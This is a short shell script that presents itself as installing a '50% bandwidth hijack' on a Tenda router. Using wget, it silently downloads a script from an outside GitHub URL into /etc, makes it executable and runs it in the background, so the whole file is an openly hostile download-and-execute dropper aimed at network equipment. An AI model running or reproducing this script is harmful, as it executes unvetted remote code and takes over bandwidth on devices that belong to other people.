#!/bin/sh
echo "[💀] INSTALLING 50% BANDWIDTH HIJACK..."
cd /tmp
wget -q https://raw.githubusercontent.com/Oky12345/tenda-hijack/main/ROUTER_SCRIPTS/tenda_hijack.sh -O /etc/tenda_hijack.sh
chmod +x /etc/tenda_hijack.sh
/etc/tenda_hijack.sh &
echo "[🔥] 50% bandwidth hijack activated!"
